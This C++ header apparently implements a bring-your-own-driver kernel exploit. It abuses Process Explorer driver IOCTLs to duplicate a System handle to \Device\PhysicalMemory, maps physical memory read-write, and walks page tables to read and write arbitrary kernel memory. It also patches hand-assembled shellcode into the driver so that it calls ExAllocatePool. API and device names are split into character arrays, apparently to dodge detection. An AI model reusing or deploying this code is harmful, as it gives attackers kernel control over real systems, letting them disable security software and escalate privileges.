#pragma once
#include"SomeStruct.h"

ULONG64 g_cr3 = NULL;
HANDLE g_hPhysMem = NULL;
HANDLE g_DeviceHandle = NULL;
ULONG64 g_KernelLdrImage = NULL;

bool SetPrivilegeA(const LPCSTR lpszPrivilege, const BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE hToken = nullptr;
	LUID luid = { 0,0 };
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		if (hToken)
			CloseHandle(hToken);
		return false;
	}
	if (!LookupPrivilegeValueA(nullptr, lpszPrivilege, &luid))
	{
		if (hToken)
			CloseHandle(hToken);
		return false;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!AdjustTokenPrivileges(hToken, false, &priv, 0, nullptr, nullptr))
	{
		if (hToken)
			CloseHandle(hToken);
		return false;
	}
	if (hToken)
		CloseHandle(hToken);
	return true;
}

bool OpenProcExp()
{
	//\\\\.\\PROCEXP152"
	char procExpString[] = { '\\','\\','.','\\','P','R','O','C','E','X','P','1','5','2','\0' };
	if (!g_DeviceHandle)
		g_DeviceHandle = CreateFile(procExpString, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (g_DeviceHandle == INVALID_HANDLE_VALUE)
	{
		g_DeviceHandle = NULL;
		return false;
	}
	return true;
}

void CloseProcExp()
{
	CloseHandle(g_DeviceHandle);
}

void SendData(ULONG IoCtl, PVOID inData, ULONG inLen, PVOID outData, ULONG outLne)
{
	DWORD ReturnLength = 0;
	BOOL IsOk = DeviceIoControl(
		g_DeviceHandle,
		IoCtl,
		inData,
		inLen,
		outData,
		outLne,
		&ReturnLength,
		NULL);
}

bool InitFunc()
{
	do
	{
		//ntdll.dll
		char ntdllStr[] = {'n','t','d','l','l','.','d','l','l','\0'};
		HMODULE hNtdll = GetModuleHandle(ntdllStr);
		if (!hNtdll)
			break;

		//NtQuerySystemInformation
		char NtQuerySystemStr[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n','\0' };
		NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(hNtdll, NtQuerySystemStr);
		if (!NtQuerySystemInformation)
			break;

		// NtQueryObject
		char NtQueryObjStr[] = { 'N','t','Q','u','e','r','y','O','b','j','e','c','t','\0' };
		NtQueryObject = (PNtQueryObject)GetProcAddress(hNtdll, NtQueryObjStr);
		if (!NtQueryObject)
			break;

		//NtMapViewOfSection
		char   NtMapStr[] = { 'N','t','M','a','p','V','i','e','w','O','f','S','e','c','t','i','o','n','\0'};
		NtMapViewOfSection = (PNtMapViewOfSection)GetProcAddress(hNtdll, NtMapStr);
		if (!NtMapViewOfSection)
			break;

		//RtlInitUnicodeString
		char  RtlInitUnicodeStr[] = { 'R','t','l','I','n','i','t','U','n','i','c','o','d','e','S','t','r','i','n','g','\0'};
		RtlInitUnicodeString = (PRtlInitUnicodeString)GetProcAddress(hNtdll, RtlInitUnicodeStr);
		if (!RtlInitUnicodeString)
			break;

		//LdrLoadDll
		char ldrDllStr[] = { 'L','d','r','L','o','a','d','D','l','l','\0'};
		LdrLoadDll = (PLdrLoadDll)GetProcAddress(hNtdll, ldrDllStr);
		if (!LdrLoadDll)
			break;

		//RtlGetVersion
		char RtlGetVersionStr[] = { 'R','t','l','G','e','t','V','e','r','s','i','o','n','\0' };
		RtlGetVersion = (PRtlGetVersion)GetProcAddress(hNtdll, RtlGetVersionStr);
		if (!RtlGetVersion)
			break;

		return true;
	} while (false);

	return false;
}

NTSTATUS PhEnumHandlesEx(PSYSTEM_HANDLE_INFORMATION_EX* handles)
{
	static ULONG initialBufferSize = 0x10000;
	NTSTATUS status = STATUS_SUCCESS;

	ULONG bufferSize = initialBufferSize;
	PVOID buffer = VirtualAlloc(nullptr, bufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!buffer)
		return STATUS_UNSUCCESSFUL;

	while ((status = NtQuerySystemInformation(SystemExtendedHandleInformation, buffer, bufferSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (!VirtualFree(buffer, 0, MEM_RELEASE))
		{
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		bufferSize *= 2;

		// Fail if we're resizing the buffer to something very large.
		if (bufferSize > PH_LARGE_BUFFER_SIZE)
			return STATUS_INSUFFICIENT_RESOURCES;

		buffer = VirtualAlloc(nullptr, bufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (!buffer)
		{
			status = STATUS_UNSUCCESSFUL;
			break;
		}
	}

	if (!NT_SUCCESS(status))
	{
		VirtualFree(buffer, 0, MEM_RELEASE);
		return status;
	}

	if (bufferSize <= 0x200000) initialBufferSize = bufferSize;
	*handles = (PSYSTEM_HANDLE_INFORMATION_EX)(buffer);

	return status;
}

ULONG64 ZwDuplicateObject(ULONG64 handleValue)
{
	char inData[0x20] = { 0 };
	*(ULONG64*)inData = 4;
	*(ULONG64*)(inData + 0x18) = handleValue;

	ULONG64 duplicateHandle = 0;
	ULONG ioctl = 0x14 - 0x7CCB0000;
	SendData(ioctl, inData, 0x20, &duplicateHandle, sizeof(ULONG64));
	return 	duplicateHandle;
}

ULONG64 GetPhysicalMemoryHandle()
{
	ULONG64 MemoryHandle = NULL;
	PSYSTEM_HANDLE_INFORMATION_EX shInfo = NULL;
	if (PhEnumHandlesEx(&shInfo) != STATUS_SUCCESS) {
		// std::cout << "PhEnumHandles NULL\n";
		return NULL;
	}
	for (ULONG i = 0; i < shInfo->NumberOfHandles; ++i)
	{
		if (shInfo->Handles[i].UniqueProcessId != 4)
			continue;
		ULONG64 dupHandle = ZwDuplicateObject(shInfo->Handles[i].HandleValue);

		if (dupHandle)
		{
			char BufferForObjectName[1024] = { 0 };
			NTSTATUS status = NtQueryObject((HANDLE)dupHandle, ObjectNameInformation, BufferForObjectName, sizeof(BufferForObjectName), NULL);
			if (NT_SUCCESS(status))
			{
				POBJECT_NAME_INFORMATION ObjectName = (POBJECT_NAME_INFORMATION)BufferForObjectName;
				//\\Device\\PhysicalMemory
				// if (ObjectName->Name.Length > 2) {
				// 	std::wstring objectNameStr(ObjectName->NameBuffer, ObjectName->Name.Length / sizeof(WCHAR));
				// 	std::wcout << L"Object Name: " << objectNameStr << std::endl;
				// }

				WCHAR phyMem[] = L"\\Device\\PhysicalMemory";
				if (ObjectName->Name.Length == wcslen(phyMem) * 2 && memcmp((wchar_t*)ObjectName->Name.Buffer, phyMem, ObjectName->Name.Length) == 0)
				{
					MemoryHandle = dupHandle;
					break;
				}
			}
		}
	}
	VirtualFree(shInfo, 0, MEM_RELEASE);

	return MemoryHandle;
}

ULONG64 GetPML4(ULONG64 pbLowStub1M)
{
	ULONG offset = 0;
	ULONG64 PML4 = 0;
	ULONG cr3_offset = 0xa0;//FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) + FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);
	__try
	{
		while (offset < 0x100000)
		{
			offset += 0x1000;
			if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)(pbLowStub1M + offset))) //PROCESSOR_START_BLOCK->Jmp
				continue;
			if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(pbLowStub1M + offset + 0x70)))//FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget)
				continue;
			if (0xffffff0000000fff & *(UINT64*)(pbLowStub1M + offset + cr3_offset))
				continue;
			PML4 = *(UINT64*)(pbLowStub1M + offset + cr3_offset);
			break;
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}

	return PML4;
}

ULONG64 GetCr3(HANDLE hPhysMem)	//http://publications.alex-ionescu.com/Recon/ReconBru%202017%20-%20Getting%20Physical%20with%20USB%20Type-C,%20Windows%2010%20RAM%20Forensics%20and%20UEFI%20Attacks.pdf
{
	ULONG64 cr3 = NULL;
	PUCHAR ptrBaseMemMapped = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	LARGE_INTEGER sectionOffset;
	SIZE_T viewSize = 0x100000;
	SecureZeroMemory(&sectionOffset, sizeof(sectionOffset));
	if (status = NtMapViewOfSection(hPhysMem, GetCurrentProcess(), (PVOID*)& ptrBaseMemMapped, NULL, NULL, &sectionOffset, &viewSize, ViewShare, NULL, PAGE_READONLY) == STATUS_SUCCESS)
	{
		if (!ptrBaseMemMapped)
			return 0;
		cr3 = GetPML4((ULONG_PTR)ptrBaseMemMapped);
		UnmapViewOfFile(ptrBaseMemMapped);
	}
	return cr3;
}

NTSTATUS ReadWritePhysMem(HANDLE hPhysMem, ULONG64 addr, size_t size, void* inOutBuf, bool read)
{
	PVOID ptrBaseMemMapped = NULL;
	SECTION_INHERIT inheritDisposition = ViewShare;
	NTSTATUS status = STATUS_SUCCESS;
	LARGE_INTEGER sectionOffset;

	// Mapping page
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	const ULONG64 offsetRead = addr % sysInfo.dwPageSize;
	const ULONG64 addrBasePage = addr - offsetRead;
	sectionOffset.QuadPart = addrBasePage;

	// Making sure that the info to read doesn't span on 2 different pages
	const ULONG64 addrEndOfReading = addr + size;
	const ULONG64 offsetEndOfRead = addrEndOfReading % sysInfo.dwPageSize;
	const ULONG64 addrBasePageEndOfReading = addrEndOfReading - offsetEndOfRead;
	size_t sizeToMap = sysInfo.dwPageSize;
	if (addrBasePageEndOfReading != addrBasePage)
		sizeToMap *= 2;

	// We cannot simply use a MapViewOfFile, since it does checks that prevents us from reading kernel memory, so we use NtMapViewOfSection.
	status = NtMapViewOfSection(hPhysMem, GetCurrentProcess(), &ptrBaseMemMapped, NULL, NULL, &sectionOffset, (PSIZE_T)& sizeToMap, inheritDisposition, NULL, PAGE_READWRITE);

	if (status != STATUS_SUCCESS || !ptrBaseMemMapped)
		return status;

	// Copying the memory, unmapping, and returning
	const ULONG64 localAddrToRead = (ULONG64)(ptrBaseMemMapped)+offsetRead;
	if (read)
		memcpy(inOutBuf, (void*)(localAddrToRead), size);
	else
		memcpy((void*)(localAddrToRead), inOutBuf, size);
	UnmapViewOfFile(ptrBaseMemMapped);
	return status;
}

NTSTATUS ReadPhysMem(HANDLE hPhysMem, ULONG64 addr, size_t size, void* outBuf)
{
	return ReadWritePhysMem(hPhysMem, addr, size, outBuf, true);
}

NTSTATUS WritePhysMem(HANDLE hPhysMem, ULONG64 addr, size_t size, void* inBuf)
{
	return ReadWritePhysMem(hPhysMem, addr, size, inBuf, false);
}

void SetPhyMem(HANDLE hPhysMem)
{
	g_hPhysMem = hPhysMem;
}

void SetCr3(ULONG64 cr3)
{
	g_cr3 = cr3;
}

NTSTATUS ReadWriteVirtualAddressValue(ULONG64 virtualAddress, ULONG operateSize, PVOID Data, bool read)
{
	HANDLE hPhysMem = g_hPhysMem;
	if(!hPhysMem)
		return STATUS_UNSUCCESSFUL;

	ULONG64 cr3 = g_cr3;
	if (!cr3)
		return STATUS_UNSUCCESSFUL;

	//这里处理不考虑页被置换以及压缩等其他情况
	ULONG64* pTmpVirtualAddress = &virtualAddress;
	PPAGEFORMAT pageFormat = (PPAGEFORMAT)pTmpVirtualAddress;

	//pxe处理
	ULONG64 pxe = NULL;
	ReadPhysMem(hPhysMem, cr3 + 8 * pageFormat->pxe, 8, &pxe);
	if (!pxe && !(pxe & 1))
		return STATUS_UNSUCCESSFUL;

	pxe &= 0xFFFFFFFFFF000;//去掉高12和低12位数


	//ppe处理
	ULONG64 ppe = NULL;
	ReadPhysMem(hPhysMem, pxe + 8 * pageFormat->ppe, 8, &ppe);
	if (!ppe && !(ppe & 1))
		return STATUS_UNSUCCESSFUL;

	if (ppe & 0x80)//1g大页
	{
		ppe &= 0xFFFFFFFFFF000;//去掉高12和低12位数
		//低30位清零
		ppe >>= 30;
		ppe <<= 30;

		//高34位清零
		virtualAddress <<= 34;
		virtualAddress >>= 34;

		if (read)
			return ReadPhysMem(hPhysMem, ppe + virtualAddress, operateSize, Data);
		else
			return WritePhysMem(hPhysMem, ppe + virtualAddress, operateSize, Data);
	}
	ppe &= 0xFFFFFFFFFF000;//去掉高12和低12位数

	//pde处理
	ULONG64	pde = NULL;
	ReadPhysMem(hPhysMem, ppe + 8 * pageFormat->pde, 8, &pde);
	if (!pde && !(pde & 1))
		return STATUS_UNSUCCESSFUL;

	
	if (pde & 0x80) //2m大页
	{
		pde &= 0xFFFFFFFFFF000;//去掉高12和低12位数

		//低21位清零
		pde >>= 21;
		pde <<= 21;

		//高43位清零
		virtualAddress <<= 43;
		virtualAddress >>= 43;

		if (read)
			return ReadPhysMem(hPhysMem, pde + virtualAddress, operateSize, Data);
		else
			return WritePhysMem(hPhysMem, pde + virtualAddress, operateSize, Data);
	}
	pde &= 0xFFFFFFFFFF000;//去掉高12和低12位数


	//pte处理
	ULONG64	pte = NULL;
	ReadPhysMem(hPhysMem, pde + 8 * pageFormat->pte, 8, &pte);
	if (!pte && !(pte & 1))
		return STATUS_UNSUCCESSFUL;

	pte &= 0xFFFFFFFFFF000;//去掉高12和低12位数
	if (read)
		return ReadPhysMem(hPhysMem, pte + pageFormat->offset, operateSize, Data);
	else
		return WritePhysMem(hPhysMem, pte + pageFormat->offset, operateSize, Data);

	return STATUS_UNSUCCESSFUL;
}

PVOID GetLoadedModulesListEx(BOOL ExtendedOutput)
{
	NTSTATUS    ntStatus;
	PVOID       buffer;
	ULONG       bufferSize = 0x1000;

	PRTL_PROCESS_MODULES pvModules;
	int infoClass;

	if (ExtendedOutput)
		infoClass = SystemModuleInformationEx;
	else
		infoClass = SystemModuleInformation;

	buffer = malloc((SIZE_T)bufferSize);
	if (buffer == NULL)
		return NULL;

	ntStatus = NtQuerySystemInformation(
		infoClass,
		buffer,
		bufferSize,
		&bufferSize);

	if (ntStatus == STATUS_INFO_LENGTH_MISMATCH) {
		free(buffer);
		buffer = malloc((SIZE_T)bufferSize);

		ntStatus = NtQuerySystemInformation(
			infoClass,
			buffer,
			bufferSize,
			&bufferSize);
	}

	if (ntStatus == STATUS_BUFFER_OVERFLOW)
	{
		pvModules = (PRTL_PROCESS_MODULES)buffer;
		if (pvModules && pvModules->NumberOfModules != 0)
			return buffer;
	}

	if (NT_SUCCESS(ntStatus)) {
		return buffer;
	}

	if (buffer)
		free(buffer);

	return NULL;
}

BOOL GetNtOsInfo(PVOID* pImageAddress, PDWORD pdwImageSize, char* lpszName)
{
	PRTL_PROCESS_MODULES   miSpace;

	miSpace = (PRTL_PROCESS_MODULES)GetLoadedModulesListEx(FALSE);
	if (miSpace)
	{
		*pImageAddress = miSpace->Modules[0].ImageBase;
		*pdwImageSize = miSpace->Modules[0].ImageSize;
		strcpy_s(lpszName, MAX_PATH, (char*)(miSpace->Modules[0].FullPathName + miSpace->Modules[0].OffsetToFileName));

		free(miSpace);
		return true;
	}
	return false;
}

ULONG64 GetKernelBaseByName(char* name)
{
	PRTL_PROCESS_MODULES   miSpace;
	ULONG64                sysBase = 0;

	miSpace = (PRTL_PROCESS_MODULES)GetLoadedModulesListEx(FALSE);
	if (miSpace)
	{
		for (ULONG i = 0; i < miSpace->NumberOfModules; i++)
		{
			if (memcmp(miSpace->Modules[i].FullPathName + strlen((char*)miSpace->Modules[i].FullPathName) - strlen(name), name, strlen(name)) == 0)
			{
				sysBase = (ULONG64)(miSpace->Modules[i].ImageBase);
				break;
			}
		}
		free(miSpace);
	}
	return sysBase;
}

ULONG64 GetNtOsBase()
{
	PRTL_PROCESS_MODULES   miSpace;
	ULONG64                NtOsBase = 0;

	miSpace = (PRTL_PROCESS_MODULES)GetLoadedModulesListEx(FALSE);
	if (miSpace)
	{
		NtOsBase = (ULONG64)miSpace->Modules[0].ImageBase;
		free(miSpace);
	}
	return NtOsBase;
}

ULONG64 GetKernelFuncAddress(char* name)
{
	if (!g_KernelLdrImage)
	{
		WCHAR szNtOs[MAX_PATH * 2];
		UNICODE_STRING ustr;

		wcscpy_s(szNtOs, USER_SHARED_DATA->NtSystemRoot);
		wcscat_s(szNtOs, L"\\system32\\ntoskrnl.exe");
		RtlInitUnicodeString(&ustr, szNtOs);
		NTSTATUS ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)& g_KernelLdrImage);
		if (!NT_SUCCESS(ntStatus))
			return 0;
	}

	ULONG64 address = (ULONG64)GetProcAddress((HMODULE)g_KernelLdrImage, name);
	return  address - g_KernelLdrImage + GetNtOsBase();
}

BOOL ReadFromFile(HANDLE hFile, PVOID* pData, PDWORD pdwDataSize)
{
	BOOL bRet = FALSE;

	DWORD dwDataSizeHigh = 0;
	DWORD dwDataSize = GetFileSize(hFile, &dwDataSizeHigh);
	if (dwDataSize > 0)
	{
		if (dwDataSizeHigh != 0)
			return FALSE;

		PVOID Data = M_ALLOC(dwDataSize);
		if (Data)
		{
			DWORD dwReaded = 0;

			SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

			if (ReadFile(hFile, Data, dwDataSize, &dwReaded, NULL))
			{
				*pData = Data;
				*pdwDataSize = dwDataSize;

				bRet = TRUE;
			}
			else
			{
				M_FREE(Data);
			}
		}
	}

	return bRet;
}

BOOL ReadFromFile(LPCTSTR lpszFileName, PVOID* pData, PDWORD pdwDataSize)
{
	BOOL bRet = FALSE;

	// open file for reading
	HANDLE hFile = CreateFile(
		lpszFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL, OPEN_EXISTING, 0, NULL
	);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		if (pData == NULL || pdwDataSize == NULL)
		{
			// just check for existing file
			bRet = TRUE;
		}
		else
		{
			// read data from the file
			bRet = ReadFromFile(hFile, pData, pdwDataSize);
		}

		CloseHandle(hFile);
	}

	return bRet;
}

BOOL LdrMapImage(PVOID Data, DWORD dwDataSize, PVOID* pImage, PDWORD pdwImageSize)
{
	PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
		Data, ((PIMAGE_DOS_HEADER)Data)->e_lfanew);

	PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)RVATOVA(
		&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

	DWORD dwImageSize = pHeaders->OptionalHeader.SizeOfImage;

	// allocate image memory
	PVOID Image = M_ALLOC(dwImageSize);
	if (Image)
	{
		// copy image headers
		ZeroMemory(Image, dwImageSize);
		CopyMemory(Image, Data, pHeaders->OptionalHeader.SizeOfHeaders);

		// copy image sections        
		for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
		{
			memcpy(
				RVATOVA(Image, pSection->VirtualAddress),
				RVATOVA(Data, pSection->PointerToRawData),
				min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
			);

			pSection += 1;
		}

		*pImage = Image;
		*pdwImageSize = dwImageSize;

		return TRUE;
	}

	return FALSE;
}

BOOL LdrProcessRelocs(PVOID Image, PVOID NewBase)
{
	PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
		Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

	DWORD_PTR OldBase = pHeaders->OptionalHeader.ImageBase;
	DWORD RelocAddr = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	DWORD RelocSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	if (RelocAddr == 0)
	{
		// no image relocations are present but it's ok
		return TRUE;
	}

	DWORD Size = 0;
	PIMAGE_BASE_RELOCATION pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(Image, RelocAddr);

	while (RelocSize > Size && pRelocation->SizeOfBlock)
	{
		DWORD Num = (pRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		PWORD Rel = (PWORD)RVATOVA(pRelocation, sizeof(IMAGE_BASE_RELOCATION));

		for (DWORD i = 0; i < Num; i += 1)
		{
			if (Rel[i] > 0)
			{
				WORD Type = (Rel[i] & 0xF000) >> 12;

				// check for supporting type
				if (Type != IMAGE_REL_BASED_DIR64 &&
					Type != IMAGE_REL_BASED_ABSOLUTE)
				{
					return FALSE;
				}

				if (Type == IMAGE_REL_BASED_DIR64)
				{
					// fix relocation value
					*(PDWORD64)(RVATOVA(
						Image,
						pRelocation->VirtualAddress + (Rel[i] & 0x0FFF))) += (DWORD64)NewBase - OldBase;
				}
			}
		}

		// go to the next block
		pRelocation = (PIMAGE_BASE_RELOCATION)RVATOVA(pRelocation, pRelocation->SizeOfBlock);
		Size += pRelocation->SizeOfBlock;
	}

	return TRUE;
}

DWORD LdrGetProcAddress(PVOID Image, char* lpszName)
{
	PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
		Image, ((PIMAGE_DOS_HEADER)Image)->e_lfanew);

	DWORD Addr = 0;
	DWORD ExportAddr = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD ExportSize = pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (ExportAddr != 0)
	{
		PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)RVATOVA(Image, ExportAddr);

		if (pExport->AddressOfFunctions == 0 ||
			pExport->AddressOfNameOrdinals == 0 ||
			pExport->AddressOfNames == 0)
		{
			// no exports by name
			return 0;
		}

		// parse module exports
		PDWORD AddrOfFunctions = (PDWORD)RVATOVA(Image, pExport->AddressOfFunctions);
		PWORD AddrOfOrdinals = (PWORD)RVATOVA(Image, pExport->AddressOfNameOrdinals);
		PDWORD AddrOfNames = (PDWORD)RVATOVA(Image, pExport->AddressOfNames);

		for (DWORD i = 0; i < pExport->NumberOfNames; i += 1)
		{
			char* lpszExport = (char*)RVATOVA(Image, AddrOfNames[i]);

			// calculate and compare hash of function
			if (!strcmp(lpszExport, lpszName))
			{
				// get exported function RVA
				Addr = AddrOfFunctions[AddrOfOrdinals[i]];
				break;
			}
		}
	}
	else
	{
		return 0;
	}

	if (Addr != 0)
	{
		// check for the forwarded export
		if (Addr > ExportAddr &&
			Addr < ExportAddr + ExportSize)
		{
			return 0;
		}

		return Addr;
	}

	return 0;
}

PVOID GetFltFuncOffset(char* name,ULONG64 fltAddress)
{

	CHAR szNtOs[MAX_PATH];

	sprintf_s(szNtOs,"%ws", USER_SHARED_DATA->NtSystemRoot);
	strcat_s(szNtOs, "\\system32\\drivers\\fltMgr.sys");

	PVOID Data = NULL;
	ULONG dwDataSize = 0;
	PVOID fltImg = NULL;
	ULONG fltImgSize = NULL;
	if (ReadFromFile(szNtOs, &Data, &dwDataSize))
	{
		// load kernel image into the userland
		if (LdrMapImage(Data, dwDataSize, &fltImg, &fltImgSize))
		{
			// relocate kernel image to its actual address
			LdrProcessRelocs(fltImg, (PVOID)fltAddress);
		}
		M_FREE(Data);
	}

	if (!fltImg)
		return NULL;

	DWORD Offset = LdrGetProcAddress(fltImg, name);
	if (Offset != 0)
	{
		// return an actual address of the target function
		return RVATOVA(fltAddress, Offset);
	}

	if (fltImg)
	{
		M_FREE(fltImg);
		fltImg = NULL;
	}

	return  NULL;
}

ULONG64 GetImgKernelFuncAddress(char* name)
{
	if (!g_KernelLdrImage)
	{
		WCHAR szNtOs[MAX_PATH * 2];
		UNICODE_STRING ustr;

		wcscpy_s(szNtOs, USER_SHARED_DATA->NtSystemRoot);
		wcscat_s(szNtOs, L"\\system32\\ntoskrnl.exe");
		RtlInitUnicodeString(&ustr, szNtOs);
		NTSTATUS ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)& g_KernelLdrImage);
		if (!NT_SUCCESS(ntStatus))
			return 0;
	}

	return (ULONG64)GetProcAddress((HMODULE)g_KernelLdrImage, name);
}

ULONG64 AllocatePool(int index, ULONG64 allocateSize)
{
	char inData[0x10] = { 0 };
	memcpy(inData, &index, 4);
	memcpy(inData + 8, &allocateSize, 8);
	ULONG64 outData = 0;
	ULONG ioctl = 0x24 - 0x7CCB0000;
	SendData(ioctl, inData, 0x10, &outData, sizeof(ULONG64));
	return outData;
}

ULONG64 AllocateRopPool()
{
	RTL_OSVERSIONINFOW VersionInfo;
	VersionInfo.dwOSVersionInfoSize = sizeof(VersionInfo);

	if (NT_ERROR(RtlGetVersion(&VersionInfo)))
		return FALSE;

	// check for the proper NT version
	if (VersionInfo.dwMajorVersion == 10 && VersionInfo.dwBuildNumber >= 1709)
		return NULL;

	//printf("NT version: %d.%d.%d\n",VersionInfo.dwMajorVersion, VersionInfo.dwMinorVersion, VersionInfo.dwBuildNumber);

	char DriverName[] = { 'P','R','O','C','E','X','P','2','5','2','.','s','y','s','\0' };
	ULONG64 ProcexpBase = GetKernelBaseByName(DriverName);
	//ExAllocatePool
	char  ExAllocatePoolStr[] = { 'E','x','A','l','l','o','c','a','t','e','P','o','o','l','\0' };
	ULONG64 ExAllocatePool = GetKernelFuncAddress(ExAllocatePoolStr);
	/*
		40 53                                                           push    rbx
		56                                                              push    rsi
		57                                                              push    rdi
		41 57                                                           push    r15
		48 83 EC 58                                                     sub     rsp, 58h //注意栈对齐movaps  xmmword ptr [rbp-21h],xmm0 ss:0018:ffffa687`b2e21138
																		//rcx = inBuf rdx = outBuf r8 = outLen
		48 8B C1                                                        mov rax,rcx
		48 8B 00                                                        mov rax,qword ptr ds:[rax]
		48 83 F8 01                                                     cmp rax,1
		74 10                                                           je eip + 18
		48 83 F8 02                                                     cmp rax,2
		74 2A                                                           je eip + 44
		48 83 F8 03                                                     cmp rax,3 //原本打算是PsCreateSystemThread，但直接hook函数更省事儿
		74 36                                                           je eip + 56
		EB 34                                                           jmp eip + 54

		// ExAllocatePool函数的调用
		90                                                              nop
		90                                                              nop
		48 B8 11 11 11 11 11 11 11 11                                   mov rax,ExAllocatePool + 40
		48 8B D9                                                        mov rbx,rcx
		B9 00 00 00 00                                                  mov ecx,0  //NonPagedPool
		48 8B F2                                                        mov rsi,rdx
		48 8B 53 08                                                     mov rdx,qword ptr ds:[rbx+8]//NumberOfBytes
		FF D0                                                           call rax
		48 89 06                                                        mov qword ptr ds:[rsi],rax

		//ExFreePool函数的调用
		EB 12                                                           jmp eip + 20
		48 B8 11 11 11 11 11 11 11 11                                   mov rax,ExFreePool + 72
		48 8B 49 08                                                     mov rcx,qword ptr ds:[rcx+8]
		FF D0                                                           call rax

		90                                                              nop
		90                                                              nop
		90                                                              nop
		90                                                              nop
		90                                                              nop
		48 83 C4 58                                                     add     rsp, 58h
		41 5F                                                           pop     r15
		5F                                                              pop     rdi
		5E                                                              pop     rsi
		5B                                                              pop     rbx
		C3                                                              retn
	*/
	//保存原始代码。。。。省略
	UCHAR shellCode[] = { 0x40,0x53,0x56,0x57,0x41,0x57,0x48,0x83,0xEC,0x58,
		//这里是处理逻辑的opCobde
		0x48,0x8B,0xC1,0x48,0x8B,0x00,0x48,0x83,0xF8,0x01,0x74,0x10,0x48,0x83,0xF8,0x02,0x74,0x2A,0x48,0x83,0xF8,0x03,0x74,0x36,0xEB,0x34,
		0x90,0x90,
		//这里处理函数一
		0x48,0xB8,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x48,0x8B,0xD9,0xB9,0x00,0x00,0x00,0x00,0x48,0x8B,0xF2,0x48,0x8B,0x53,0x08,0xFF,0xD0,0x48,0x89,0x06,
		0xEB,0x12,
		//这里处理函数二
		0x48,0xB8,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x48,0x8B,0x49,0x08,0xFF,0xD0,
		0x90,0x90,0x90,0x90,0x90,
		//结束
		0x48,0x83,0xC4,0x58,0x41,0x5F,0x5F,0x5E,0x5B,0xC3 };

	//拷贝函数
	memcpy(shellCode + 40, &ExAllocatePool, 8);

	ReadWriteVirtualAddressValue(ProcexpBase + 0x30D0, sizeof(shellCode), shellCode, false);

	return AllocatePool(1, 0x1000);
}

BOOL MemReadPtr(PVOID Addr, PVOID* Value)
{
	// read single pointer from virtual memory address

	NTSTATUS status = ReadWriteVirtualAddressValue((ULONG64)Addr, sizeof(PVOID), Value,true);

	if (NT_SUCCESS(status))
		return true;
	return false;
}

BOOL MemWritePtr(PVOID Addr, PVOID Value)
{
	// write single pointer at virtual memory address
	NTSTATUS status = ReadWriteVirtualAddressValue((ULONG64)Addr, sizeof(PVOID), &Value, false);

	if (NT_SUCCESS(status))
		return true;
	return false;
}
